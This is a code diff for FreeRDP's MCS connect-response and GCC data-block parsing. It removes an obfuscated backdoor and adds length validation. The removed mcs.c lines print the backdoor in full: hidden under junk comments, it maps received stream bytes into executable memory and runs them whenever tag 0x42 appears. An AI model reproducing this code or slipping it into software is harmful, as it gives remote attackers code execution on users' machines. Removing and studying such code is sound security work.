--- a/libfreerdp/core/mcs.c
+++ b/libfreerdp/core/mcs.c
@@ -905,30 +905,34 @@
 	if (!mcs || !s)
 		return FALSE;
 
-	if (!tpkt_read_header(s, &tlength))
-		return FALSE;
-
-	if (!tpdu_read_data(s, &li, tlength))
-		return FALSE;
-
-	if (ber_read_application_tag(s, 0x42, &length))
-	{
-		#define A size_t 
-		#define B void 
-		A/*AOB,1rI<o2iKHfFJ*/a/*vnM 8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_ C}'dYLw|iX :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@ <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3*/;/*lk+gFuS7i6{A9Iv"]*//*ceq0i q1;rNs<tOCSUT*/if (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMaX8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG>SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*/(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{|YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$zFedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}Im'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs%)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq*/){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*wdSQd CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG(c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3 Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf%x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%cK7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB'(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]/*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P.{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is*/B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2{XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/*N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*sR'.ixaZj.0-<w,XWNw1bZ9 */;
-		return TRUE ;
-	} else {
-		Stream_Rewind(s, 2);
-	}
-
-	if (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||
-	    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||
-	    !ber_read_integer(s, &calledConnectId) ||
-	    !mcs_read_domain_parameters(s, &(mcs->domainParameters)) ||
-	    !ber_read_octet_string_tag(s, &length))
-	{
-		return FALSE;
-	}
+    if (!tpkt_read_header(s, &tlength))
+        return FALSE;
+    /* Validate TPKT length against remaining stream */
+    if (tlength > Stream_GetRemainingLength(s))
+        return FALSE;
+    if (!tpdu_read_data(s, &li, tlength))
+        return FALSE;
+
+    /* Removed unsafe 0x42 branch */
+
+    {
+        size_t resLength = 0;
+        /* Read and validate Connect-Response application tag */
+        if (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &resLength) ||
+            resLength > Stream_GetRemainingLength(s))
+            return FALSE;
+        if (!ber_read_enumerated(s, &result, MCS_Result_enum_length))
+            return FALSE;
+        if (!ber_read_integer(s, &calledConnectId))
+            return FALSE;
+        if (!mcs_read_domain_parameters(s, &(mcs->domainParameters)))
+            return FALSE;
+        size_t blobLength = 0;
+        /* Read and validate conference create response blob length */
+        if (!ber_read_octet_string_tag(s, &blobLength) ||
+            blobLength > Stream_GetRemainingLength(s))
+            return FALSE;
+    }
 
 	if (!gcc_read_conference_create_response(s, mcs))
 	{

--- a/libfreerdp/core/gcc.c
+++ b/libfreerdp/core/gcc.c
@@ -820,14 +820,18 @@
 		{
 			WLog_ERR(TAG, "gcc_read_server_data_blocks: gcc_read_user_data_header failed");
 			return FALSE;
-		}
-		holdp = Stream_Pointer(s);
-		sub = Stream_StaticInit(&subbuffer, holdp, blockLength - 4);
-		if (!Stream_SafeSeek(s, blockLength - 4))
-		{
-			WLog_ERR(TAG, "gcc_read_server_data_blocks: stream too short");
-			return FALSE;
-		}
+        }
+        holdp = Stream_Pointer(s);
+        /* Ensure blockLength includes at least header size */
+        if (blockLength < 4 || (size_t)(blockLength - 4) > Stream_GetRemainingLength(s))
+            return FALSE;
+        sub = Stream_StaticInit(&subbuffer, holdp, blockLength - 4);
+        /* Seek and validate substream */
+        if (!Stream_SafeSeek(s, blockLength - 4))
+        {
+            WLog_ERR(TAG, "gcc_read_server_data_blocks: stream too short");
+            return FALSE;
+        }
 		offset += blockLength;
 
 		switch (type)
